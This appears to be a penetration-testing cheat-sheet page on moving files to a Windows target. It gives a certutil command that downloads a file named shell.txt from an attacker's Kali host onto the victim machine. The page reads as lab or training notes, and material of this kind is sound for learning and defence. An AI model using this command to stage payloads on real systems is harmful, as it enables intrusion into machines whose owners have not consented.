---
title: Certutil
layout: default
nav_order: 2
parent: File Transfers

---

# Certutil
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---

### Certutil File Transfers

Transferring files from Kali machine to target machine (Windows) via `certutil`

On Windows machine: 

1. Set IP to Kali machine IP
```powershell
$IP="192.168.119.239"
```
2. Set port to port that hosts desired file on Kali machine
```powershell
$port="8000"
```
3. Run `certutil` on windows target to grab desired file
```powershell
certutil -urlcache -split -f http://${IP}:${port}/shell.txt shell.txt
```
4. Confirm that file has been downloaded
```powershell
ls shell.txt
```

